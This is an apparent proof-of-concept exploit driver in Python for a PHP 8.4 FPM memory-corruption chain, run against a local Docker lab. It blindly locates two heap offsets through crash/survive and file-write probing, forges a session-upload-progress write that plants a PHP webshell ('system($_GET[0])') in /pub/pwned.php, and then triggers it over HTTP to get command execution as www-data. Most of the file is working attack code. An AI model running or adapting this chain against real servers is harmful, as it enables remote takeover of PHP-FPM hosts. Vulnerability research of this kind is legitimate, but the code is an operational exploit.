#!/usr/bin/env python3
"""Standalone black-box (X, ps_files) locator -> forge fire, NO offset table / NO gdb /
NO leak / NO ground-truth input beyond two bounded windows and the per-SAPI sub-slot.

Composes the three oracles end to end:
  1. blind_x_survive_oracle.x_survivors  -> the SET of X candidates that survive a benign
     in-carrier AIM (ps_files-INDEPENDENT). This is a PRE-FILTER: it contains X* plus a
     few benign-AIM false-survives (empirically 0x142-0x144 alongside X*=0x147 here), so
     it prunes the X axis but does not pin X* alone over a wide window.
  2. blind_psfiles_oracle.sweep_psfiles  -> for each surviving X candidate, sweep the
     ps_files residue; the EXACT GET-fire file-write DISAMBIGUATES -- only the true X*
     yields a writing residue, giving (X*, residue*) together.
  3. forge at (X*, residue*)             -> webshell written + GET fires it.

This resolves the X<->ps_files circularity without a 2-D product: the survive pre-filter
cuts the X axis to a handful of candidates, and the file-write both disambiguates X and
pins ps_files. The ONLY per-target inputs are the two page WINDOWS (a per-build range or a
leak-supplied prior) and the per-SAPI sub-page slot (0x208 fpm). SETTLED_CONST is consulted
ONLY at the end to cross-check the located values -- never fed into the sweeps.

Lab: profile fpmfire (single-worker php:8.4.26-fpm behind nginx, writable /pub):
    docker compose -f docker-compose.fpm-avenues.yml --profile fpmfire up -d --build
    # nginx 127.0.0.1:18085
Run (slow: fresh container per probe; the wide X window exercises the disambiguation):
    python3 -I poc/chains/verify_fpm_blind_locate.py

PASS = the survive pre-filter + file-write disambiguation locate (X*, residue*), each
MATCHES ground truth (cross-check only), AND the forge at the located pair writes the
webshell + a plain GET fires it (uid=33(www-data)) + worker survives.
"""
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.oracles.blind_x_survive_oracle import x_survivors  # noqa: E402
from primitives.oracles.blind_psfiles_oracle import forge_carrier, sweep_psfiles  # noqa: E402
from primitives.write.kfree_stagefed_forge import (  # noqa: E402
    SETTLED_CONST, arm_parts, pretouch_parts, backing_field)
from common.multipart import multipart_tuple, part_tuple  # noqa: E402

REPO = os.path.dirname(_POC_ROOT)
COMPOSE_FILE = os.path.join(REPO, "docker-compose.fpm-avenues.yml")
BASE = "http://127.0.0.1:18085"
PROFILE = "fpmfire"
CONTAINER = "p2s-fpmfire-fpm"
SID = "sess0000000000000000000000000001"
SF = "/tmp/sess_" + SID
WEBSHELL = b"<?php system($_GET[0]);?>"
TARGET = "/var/www/html/pub/pwned.php"
URLPATH = "/pub/pwned.php"
BND = b"----l2"

# ground truth -- CROSS-CHECK ONLY, never fed to the sweeps
GT_XSTAR = SETTLED_CONST["d_choff"] - SETTLED_CONST["carrier_base"]
GT_RESIDUE = SETTLED_CONST["ps_files"] - SETTLED_CONST["carrier_base"]
SUBSLOT = SETTLED_CONST["ps_files"] & 0xfff            # 0x208 (per-SAPI, an input)

# bounded priors (a per-build range or a leak would supply these), off-center on purpose.
# X_PAGES is deliberately WIDE enough to include the benign-AIM false-survives (0x142-0x144)
# so the file-write disambiguation step is exercised, not bypassed by a lucky narrow window.
X_PAGES, X_CENTER = range(0x144, 0x14b), 0x145          # incl. false-survive 0x144 and true X* 0x147
RES_PAGES, RES_CENTER = range(-0x9, -0x12, -1), -0xb    # residue* is page -0xd


def comp(*a, t=180):
    return subprocess.run(["docker", "compose", "-f", COMPOSE_FILE, "--profile", PROFILE, *a],
                          cwd=REPO, capture_output=True, text=True, timeout=t)


def dx(*c, t=30):
    return subprocess.run(["docker", "exec", CONTAINER, *c], capture_output=True, text=True, timeout=t).stdout


def http(path, data=None, ct=None, t=90, cookie=False):
    req = urllib.request.Request(BASE + path, data=data)
    if ct:
        req.add_header("Content-Type", ct)
    if cookie:
        req.add_header("Cookie", "PHPSESSID=" + SID)
    try:
        with urllib.request.urlopen(req, timeout=t) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return None, repr(e).encode()


def wpid():
    s, b = http("/probe.php", t=8)
    return b.split(b":", 1)[1].decode().strip() if (s == 200 and b.startswith(b"ALIVE:")) else None


def ready():
    for _ in range(80):
        if wpid():
            return True
        time.sleep(0.5)
    return False


_booted = [False]


def _fresh():
    """Fresh WORKER per probe: recreate only the fpm container (new php-fpm master+worker,
    clean heap + tmpfs), leaving the shared network/nginx up. Avoids the compose-`down`
    network-teardown stall against the co-resident always-on stack over many cycles."""
    if not _booted[0]:
        comp("up", "-d", "--force-recreate", "--remove-orphans", t=180)
        _booted[0] = True
    comp("up", "-d", "--force-recreate", "--no-deps", "fpmfire-fpm", t=120)
    return ready()


def _arm_once():
    dx("sh", "-c", f"printf %s 'aa|i:9;bb|i:2;' > {SF}; chown www-data {SF}")
    pb, ph = multipart_tuple(pretouch_parts(), BND)
    http("/arm.php", data=pb, ct=ph["Content-Type"])
    http("/echo.php")
    p0 = wpid()
    ab, ah = multipart_tuple(arm_parts(), BND)
    http("/arm.php", data=ab, ct=ah["Content-Type"])
    return p0


def _stage(carrier):
    parts = [part_tuple("C", carrier),
             part_tuple("B", backing_field(TARGET, SETTLED_CONST)), part_tuple("B", b"x"),
             part_tuple("PHP_SESSION_UPLOAD_PROGRESS", WEBSHELL),
             part_tuple("f", b"Z" * 64, filename="a.bin", ctype="application/octet-stream")]
    sb, sh = multipart_tuple(parts, BND)
    http("/echo.php", data=sb, ct=sh["Content-Type"], cookie=True, t=30)


def _run(x, residue):
    """One fresh-worker forge. Returns (wrote, surv)."""
    if not _fresh():
        raise RuntimeError("boot")
    p0 = _arm_once()
    _stage(forge_carrier(x, residue))
    ls = dx("sh", "-c", f"ls {TARGET} 2>&1").strip()
    wrote = TARGET in ls and "No such" not in ls
    p1 = wpid()
    return wrote, (p1 is not None and p1 == p0)


def probe_survive(x, residue):
    wrote, surv = _run(x, residue)
    print(f"  [x] x=0x{x:x} surv={surv} wrote={wrote}", flush=True)
    return surv and not wrote


def probe_write(x, residue):
    wrote, _ = _run(x, residue)
    print(f"  [ps] residue=0x{residue & 0xffffffffffff:x} wrote={wrote}", flush=True)
    return wrote


def fire(x, residue):
    if not _fresh():
        return False, "boot"
    p0 = _arm_once()
    _stage(forge_carrier(x, residue))
    ls = dx("sh", "-c", f"ls {TARGET} 2>&1").strip()
    wrote = TARGET in ls and "No such" not in ls
    nonce = "FIRE%08x" % int.from_bytes(os.urandom(4), "big")
    body = ""
    if wrote:
        s, b = http(f"{URLPATH}?0={urllib.parse.quote('echo ' + nonce + ';id')}", t=15)
        body = (b or b"").decode("latin-1", "replace")
    p1 = wpid()
    uid = re.search(r"uid=\d+\([^)]*\)", body)
    fired = (nonce in body) and bool(re.search(r"uid=\d+\(www-data\)", body))
    surv = p1 is not None and p1 == p0
    return (wrote and fired and surv), (f"wrote={wrote} fired={fired} surv={surv} "
            f"uid='{uid.group(0) if uid else 'n/a'}' p=({p0},{p1})")


def main():
    if subprocess.run(["docker", "version"], capture_output=True).returncode != 0:
        print("SKIP: docker unavailable"); return
    print(f"# standalone blind (X, ps_files) locate+fire. inputs: X_pages=[{X_PAGES.start:#x}.."
          f"{X_PAGES.stop:#x}) res_pages=[{RES_PAGES.start:#x}..{RES_PAGES.stop:#x}) subslot=0x{SUBSLOT:x}; "
          f"GT X*=0x{GT_XSTAR:x} residue*=0x{GT_RESIDUE & 0xffffffffffff:x} (cross-check only)", flush=True)

    print("\n# stage 1: pre-filter X candidates by crash/survive (benign AIM, ps_files-independent)", flush=True)
    survivors = x_survivors(probe_survive, X_PAGES, center=X_CENTER)
    print(f"# -> X survivors = {[hex(x) for x in survivors]} "
          f"(contains X* plus benign-AIM false-survives; file-write disambiguates)", flush=True)
    if not survivors:
        comp("stop", "-t", "3", t=60); print("\nFAIL: no surviving X candidate"); return

    print("\n# stage 2: disambiguate -- the X* is the survivor whose residue sweep WRITES the file", flush=True)
    xstar = residue = None
    for cand in survivors:
        print(f"#  trying X=0x{cand:x}", flush=True)
        r = sweep_psfiles(probe_write, cand, RES_PAGES, subslot=SUBSLOT, center=RES_CENTER)
        if r is not None:
            xstar, residue = cand, r
            break
    print(f"# -> X* = {('0x%x' % xstar) if xstar is not None else 'NONE'}; "
          f"residue* = {('0x%x' % (residue & 0xffffffffffff)) if residue is not None else 'NONE'}", flush=True)
    if residue is None:
        comp("stop", "-t", "3", t=60); print("\nFAIL: no (X, ps_files) pair wrote the file"); return

    xmatch, rmatch = (xstar == GT_XSTAR), (residue == GT_RESIDUE)
    print(f"\n# cross-check: X* {'MATCH' if xmatch else 'MISMATCH'} (0x{xstar:x} vs 0x{GT_XSTAR:x}); "
          f"residue* {'MATCH' if rmatch else 'MISMATCH'} "
          f"(0x{residue & 0xffffffffffff:x} vs 0x{GT_RESIDUE & 0xffffffffffff:x})", flush=True)

    print("\n# stage 3: fire at the located (X*, residue*)", flush=True)
    ok, line = fire(xstar, residue)
    print(f"# fire: {line} -> {'PASS' if ok else 'FAIL'}", flush=True)
    comp("stop", "-t", "3", t=60)
    overall = ok and xmatch and rmatch
    print(f"\n{'PASS' if overall else 'FAIL'}: standalone black-box (X, ps_files) derivation "
          f"-> forge fired (uid-in-hand), both values match ground truth", flush=True)


if __name__ == "__main__":
    main()
